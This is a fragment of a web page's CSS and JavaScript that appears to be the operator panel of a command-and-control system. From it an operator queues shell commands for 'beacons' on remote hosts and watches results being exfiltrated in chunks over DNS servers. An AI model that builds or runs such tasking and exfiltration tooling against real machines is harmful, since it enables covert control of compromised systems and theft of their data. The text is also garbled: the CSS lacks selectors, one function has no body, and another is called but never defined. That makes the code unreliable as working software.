            box-sizing: border-box;

            color: #e0e0e0;
        }

        .navbar {
            background: rgba(10, 10, 10, 0.98);
            border-bottom: 1px solid rgba(255, 51, 51, 0.2);

            content: '';

            left: 0;
            bottom: -1px;

            content: '';

            left: -10px;

                />

    <script>
        const API_BASE = window.location.origin;
        let currentBeaconId = '';
        let currentBeaconHostname = '';
        let selectedTaskId = null;
        let autoRefreshInterval = null;
        let isCreatingTask = false; // Prevent multiple simultaneous task creations

        // Get URL parameters
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                beaconId: params.get('id'),
                hostname: params.get('hostname')
            };
        }

        // Helper to get cookie
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
            return null;
        }

        // Auth fetch wrapper with cookie-based auth and CSRF protection
        async function authFetch(url, options = {}) {
            const headers = {
                'Content-Type': 'application/json',
                ...options.headers
            };

            // Add CSRF token for state-changing requests
            if (options.method && options.method !== 'GET') {
                const csrfToken = getCookie('csrf_token');
                if (csrfToken) {
                    headers['X-CSRF-Token'] = csrfToken;
                }
            }

            const response = await fetch(API_BASE + url, {
                ...options,
                headers,
                credentials: 'include' // Include cookies
            });

            if (response.status === 401 || response.status === 403) {
                window.location.href = '/login';
                return null;
            }

            return response;
        }

        // Show alert message
        function showAlert(message, type = 'success') {
            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.textContent = message;
            container.innerHTML = '';
            container.appendChild(alert);

            setTimeout(() => {
                alert.remove();
            }, 5000);
        }

        // Load beacon information

        // Load DNS contact history for this beacon
        async function loadDNSContacts() {

        // Load tasks for this beacon
        async function loadTasks() {
            try {
                const response = await authFetch('/api/tasks?limit=100');
                if (!response) return;

                const data = await response.json();
                const allTasks = data.tasks || [];
                
                // Filter tasks for this beacon
                const beaconTasks = allTasks.filter(task => task.beacon_id === currentBeaconId);

                if (beaconTasks.length === 0) {
                    document.getElementById('tasksList').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">üìã</div>
                            <div>No tasks yet</div>
                        </div>`;
                    return;
                }

                const tasksHtml = beaconTasks.map(task => {
                    // Determine display status and styling
                    let displayStatus = task.status.toUpperCase();
                    let statusClass = task.status;
                    let progressHtml = '';

                    // Enhanced status display for better clarity
                    if (task.status === 'pending') {
                        displayStatus = 'QUEUED';
                    } else if (task.status === 'exfiltrating') {
                        displayStatus = 'EXFILTRATING';
                        statusClass = 'exfiltrating';
                        // Show progress if available
                        if (task.progress) {
                            const prog = task.progress;
                            progressHtml = `
                                <div class="task-progress-inline">
                                    <div class="progress-bar-container-small">
                                        <div class="progress-bar-small" style="width: ${prog.progress}%"></div>
                                    </div>
                                    <div class="progress-text-small">${prog.received_chunks}/${prog.total_chunks} chunks (${prog.progress}%)</div>
                                </div>`;
                        }
                    } else if (task.status === 'sent' && task.progress) {
                        // Task is being executed and data is being exfiltrated
                        const prog = task.progress;
                        if (prog.received_chunks === 0) {
                            displayStatus = 'EXECUTING';
                        } else if (prog.received_chunks < prog.total_chunks) {
                            displayStatus = 'EXFILTRATING';
                            statusClass = 'exfiltrating';
                            // Show inline progress bar
                            progressHtml = `
                                <div class="task-progress-inline">
                                    <div class="progress-bar-container-small">
                                        <div class="progress-bar-small" style="width: ${prog.progress}%"></div>
                                    </div>
                                    <div class="progress-text-small">${prog.received_chunks}/${prog.total_chunks} chunks (${prog.progress}%)</div>
                                </div>`;
                        } else {
                            displayStatus = 'ASSEMBLING';
                            statusClass = 'assembling';
                        }
                    } else if (task.status === 'sent') {
                        displayStatus = 'SENT';
                    } else if (task.status === 'failed') {
                        displayStatus = 'FAILED';
                        statusClass = 'failed';
                    } else if (task.status === 'expired') {
                        displayStatus = 'EXPIRED';
                        statusClass = 'expired';
                    } else if (task.status === 'partial') {
                        displayStatus = 'PARTIAL';
                        statusClass = 'partial';
                        // Show what was received
                        if (task.progress) {
                            const prog = task.progress;
                            progressHtml = `
                                <div class="task-progress-inline">
                                    <div style="color: #ff8c00; font-size: 11px;">
                                        ‚ö†Ô∏è ${prog.received_chunks}/${prog.total_chunks} chunks received before failure
                                    </div>
                                </div>`;
                        }
                    } else if (task.status === 'timeout') {
                        displayStatus = 'TIMEOUT';
                        statusClass = 'timeout';
                    }

                    return `
                        <div class="task-item ${selectedTaskId === task.id ? 'selected' : ''}" onclick="selectTask('${task.id}')">
                            <div class="task-header">
                                <span class="task-id">${task.id}</span>
                                <span class="task-status ${statusClass}">${displayStatus}</span>
                            </div>
                            <div class="task-command">$ ${task.command}</div>
                            ${progressHtml}
                            <div class="task-time">Created: ${formatTimestamp(task.created_at)}</div>
                            ${task.completed_at ? `<div class="task-time">Completed: ${formatTimestamp(task.completed_at)}</div>` : ''}
                            <div class="task-actions" onclick="event.stopPropagation()">
                                ${task.status !== 'completed' && task.status !== 'failed' ? `<button class="task-action-btn fail-btn" onclick="markTaskFailed('${task.id}')" title="Mark as Failed">‚úó Fail</button>` : ''}
                                <button class="task-action-btn delete-btn" onclick="deleteTask('${task.id}')" title="Delete">üóë Delete</button>
                            </div>
                        </div>
                    `;
                }).join('');

                document.getElementById('tasksList').innerHTML = tasksHtml;
            } catch (error) {
                console.error('Error loading tasks:', error);
            }
        }

        // Select a task and load its result
        async function selectTask(taskId) {
            selectedTaskId = taskId;
            loadTasks(); // Refresh to show selection

            try {
                const response = await authFetch(`/api/tasks/${taskId}`);
                if (!response) return;

                const task = await response.json();

                const resultSection = document.getElementById('resultSection');
                const resultTitle = document.getElementById('resultTitle');
                const resultContent = document.getElementById('resultContent');

                resultTitle.textContent = `Task ${task.id} - ${task.command}`;

                if (task.status === 'completed' && task.result) {
                    resultContent.textContent = task.result;
                    resultSection.style.display = 'block';
                } else if (task.status === 'exfiltrating' || (task.status === 'sent' && task.progress)) {
                    // Show progress bar for tasks in progress
                    const progress = task.progress;
                    let statusMessage = '';
                    let statusIcon = '';

                    if (!progress || progress.received_chunks === 0) {
                        statusIcon = 'üì§';
                        statusMessage = 'Beacon is sending results back...';
                    } else if (progress.received_chunks < progress.total_chunks) {
                        statusIcon = 'üì•';
                        statusMessage = `Exfiltrating results via Shadow Mesh (distributed across ${task.dns_servers || 'multiple'} DNS servers)`;
                    } else {
                        statusIcon = 'üîÑ';
                        statusMessage = 'All chunks received, assembling final result...';
                    }

                    if (progress) {
                        resultContent.innerHTML = `
                            <div class="no-result">
                                <div style="font-size: 32px; margin-bottom: 10px;">${statusIcon}</div>
                                <div style="font-size: 14px; margin-bottom: 20px;">${statusMessage}</div>
                                <div class="progress-bar-container">
                                    <div class="progress-bar" style="width: ${progress.progress}%"></div>
                                </div>
                                <div class="progress-text" style="margin-top: 10px; font-size: 13px;">
                                    <strong>${progress.received_chunks} / ${progress.total_chunks} chunks</strong> (${progress.progress}%)
                                </div>
                                ${progress.status ? `<div style="color: #555; font-size: 11px; margin-top: 5px;">Status: ${progress.status}</div>` : ''}
                            </div>`;
                    } else {
                        resultContent.innerHTML = `
                            <div class="no-result">
                                <div style="font-size: 32px; margin-bottom: 10px;">${statusIcon}</div>
                                <div style="font-size: 14px;">${statusMessage}</div>
                            </div>`;
                    }
                    resultSection.style.display = 'block';
                } else if (task.status === 'pending') {
                    resultContent.innerHTML = '<div class="no-result">Task queued, waiting for beacon check-in...</div>';
                    resultSection.style.display = 'block';
                } else if (task.status === 'sent') {
                    resultContent.innerHTML = '<div class="no-result">Task sent, waiting for beacon to start execution...</div>';
                    resultSection.style.display = 'block';
                } else if (task.status === 'failed') {
                    const failureReason = task.result || 'Unknown failure reason';
                    resultContent.innerHTML = `
                        <div class="no-result">
                            <div style="font-size: 32px; margin-bottom: 10px;">‚ùå</div>
                            <div style="font-size: 16px; margin-bottom: 10px; color: #ff6666;">Task Failed</div>
                            <div style="color: #ff8888; margin: 15px 0; font-size: 13px; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 4px;">
                                ${escapeHtml(failureReason)}
                            </div>
                            <div style="color: #999; font-size: 12px; line-height: 1.6; margin-top: 15px;">
                                Tasks are sent once and not retried automatically.<br>
                                This task was marked as failed because the beacon did not execute it.<br>
                                <br>
                                <strong>Possible causes:</strong><br>
                                ‚Ä¢ Beacon didn't receive the task (network issue)<br>
                                ‚Ä¢ Beacon couldn't execute the command (permission/shell issue)<br>
                                ‚Ä¢ Beacon crashed during execution<br>
                                <br>
                                You can create a new task if the beacon is still active.
                            </div>
                        </div>`;
                    resultSection.style.display = 'block';
                } else if (task.status === 'expired') {
                    resultContent.innerHTML = `
                        <div class="no-result">
                            <div style="font-size: 32px; margin-bottom: 10px;">‚è∞</div>
                            <div style="font-size: 16px; margin-bottom: 10px;">Task Expired</div>
                            <div style="color: #999; font-size: 13px;">
                                Beacon did not check in within 48 hours
                            </div>
                            <div style="color: #444; margin-top: 15px; font-size: 12px; line-height: 1.6;">
                                This task was automatically expired by the cleanup job.<br>
                                The beacon may be offline or have a very long callback interval.<br>
                                You can create a new task if the beacon comes back online.
                            </div>
                        </div>`;
                    resultSection.style.display = 'block';
                } else if (task.status === 'partial') {
                    const prog = task.progress || {received_chunks: 0, total_chunks: 0};
                    const percentReceived = prog.total_chunks > 0 
                        ? Math.round((prog.received_chunks / prog.total_chunks) * 100) 
                        : 0;
                    resultContent.innerHTML = `
                        <div class="no-result">
                            <div style="font-size: 32px; margin-bottom: 10px;">‚ö†Ô∏è</div>
                            <div style="font-size: 16px; margin-bottom: 10px;">Partial Result - Transfer Incomplete</div>
                            <div style="color: #ff8c00; margin: 15px 0; font-size: 14px;">
                                Received ${prog.received_chunks} of ${prog.total_chunks} chunks (${percentReceived}%)
                            </div>
                            <div style="color: #444; font-size: 12px; line-height: 1.6;">
                                Beacon stopped responding before completing the transfer.<br>
                                The beacon may have crashed, lost network, or been terminated.<br>
                                <br>
                                You can retry the task if the beacon comes back online.
                            </div>
                        </div>`;
                    resultSection.style.display = 'block';
                } else if (task.status === 'timeout') {
                    resultContent.innerHTML = `
                        <div class="no-result">
                            <div style="font-size: 32px; margin-bottom: 10px;">‚è±Ô∏è</div>
                            <div style="font-size: 16px; margin-bottom: 10px;">Task Timeout</div>
                            <div style="color: #cd853f; margin: 15px 0; font-size: 13px;">
                                Task execution exceeded the timeout limit
                            </div>
                            <div style="color: #444; font-size: 12px; line-height: 1.6;">
                                The command may have hung or taken longer than expected.<br>
                                Consider breaking down long-running tasks or increasing timeout limits.
                            </div>
                        </div>`;
                    resultSection.style.display = 'block';
                } else {
                    resultContent.innerHTML = '<div class="no-result">No result available</div>';
                    resultSection.style.display = 'block';
                }

                // Scroll to result
                resultSection.scrollIntoView({ behavior: 'smooth' });
            } catch (error) {
                console.error('Error loading task result:', error);
                showAlert('Failed to load task result', 'error');
            }
        }

        // Create a new task
        async function createTask() {
            // Prevent multiple simultaneous task submissions
            if (isCreatingTask) {
                console.log('Task creation already in progress, ignoring...');
                return;
            }

            const commandInput = document.getElementById('commandInput');
            const command = commandInput.value.trim();

            if (!command) {
                showAlert('Please enter a command', 'error');
                return;
            }

            try {
                isCreatingTask = true;
                document.getElementById('loadingOverlay').classList.add('show');

                // Pause auto-refresh during task creation
                if (autoRefreshInterval) {
                    clearInterval(autoRefreshInterval);
                    autoRefreshInterval = null;
                }

                const response = await authFetch(`/api/beacons/${currentBeaconId}/task`, {
                    method: 'POST',
                    body: JSON.stringify({
                        beacon_id: currentBeaconId,
                        command: command
                    })
                });

                if (!response) {
                    throw new Error('Failed to create task');
                }

                const result = await response.json();

                if (result.success) {
                    showAlert(`Task created successfully: ${result.data.task_id}`, 'success');
                    commandInput.value = '';
                    
                    // Reload tasks immediately
                    await loadTasks();
                } else {
                    showAlert(result.message || 'Failed to create task', 'error');
                }
            } catch (error) {
                console.error('Error creating task:', error);
                showAlert('Failed to create task', 'error');
            } finally {
                isCreatingTask = false;
                document.getElementById('loadingOverlay').classList.remove('show');
                
                // Resume auto-refresh after task creation
                if (!autoRefreshInterval) {
                    autoRefreshInterval = setInterval(() => {
                        loadTasks();
                        if (selectedTaskId) {
                            selectTask(selectedTaskId);
                        }
                    }, 5000);
                }
            }
        }

        // Handle Enter key in command input
        function handleEnterKey(event) {
            if (event.key === 'Enter') {
                createTask();
            }
        }

        // Copy result to clipboard
        function copyResult() {
            const resultContent = document.getElementById('resultContent').textContent;
            navigator.clipboard.writeText(resultContent).then(() => {
                showAlert('Result copied to clipboard', 'success');
            }).catch(err => {
                showAlert('Failed to copy result', 'error');
            });
        }

        // Format timestamp
        function formatTimestamp(timestamp) {
            if (!timestamp) return 'Never';
            const date = new Date(timestamp);
            const now = new Date();
            const diff = Math.floor((now - date) / 1000);

            if (diff < 60) return `${diff}s ago`;
            if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
            if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
        }

        function isOnline(timestamp) {
            if (!timestamp) return false;
            const date = new Date(timestamp);
            const now = new Date();
            const diff = Math.floor((now - date) / 1000);
            return diff < 600; // Online if seen within 10 minutes (matches server-side)
        }

        // Escape HTML to prevent XSS
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Initialize page
        async function initializePage() {
            const params = getUrlParams();
            
            if (!params.beaconId) {
                showAlert('No beacon ID specified', 'error');
                setTimeout(() => {
                    window.location.href = '/dashboard';
                }, 2000);
                return;
            }

            currentBeaconId = params.beaconId;
            currentBeaconHostname = params.hostname || 'Unknown';

            document.getElementById('loadingOverlay').classList.add('show');

            try {
                await loadBeaconInfo();
                await loadTasks();
            } catch (error) {
                console.error('Error initializing page:', error);
                showAlert('Failed to load beacon data', 'error');
            } finally {
                document.getElementById('loadingOverlay').classList.remove('show');
            }

            // Auto-refresh tasks every 5 seconds
            autoRefreshInterval = setInterval(() => {
                loadTasks();
                if (selectedTaskId) {
                    selectTask(selectedTaskId);
                }
            }, 5000);
        }

        async function markTaskFailed(taskId) {
            if (!confirm('Mark this task as failed?')) return;
            
            try {
                const response = await authFetch(`/api/tasks/${taskId}/status`, {
                    method: 'PATCH',
                    body: JSON.stringify({ status: 'failed' })
                });
                
                if (response && response.ok) {
                    loadTasks();
                    if (selectedTaskId === taskId) {
                        selectTask(taskId);
                    }
                } else {
                    alert('Failed to update task status');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Failed to update task status');
            }
        }

        async function deleteTask(taskId) {
            if (!confirm('Delete this task? This cannot be undone.')) return;
            
            try {
                const response = await authFetch(`/api/tasks/${taskId}`, {
                    method: 'DELETE'
                });
                
                if (response && response.ok) {
                    if (selectedTaskId === taskId) {
                        selectedTaskId = null;
                        document.getElementById('resultSection').style.display = 'none';
                    }
                    loadTasks();
                } else {
                    alert('Failed to delete task');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Failed to delete task');
            }
        }

        // Logout function
        async function logout() {
            try {
                await authFetch('/api/auth/logout', { method: 'POST' });
            } catch (error) {
                console.error('Logout error:', error);
            }
            window.location.href = '/login';
        }

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
            }
        });

        // Start the page
        initializePage();
    </script>
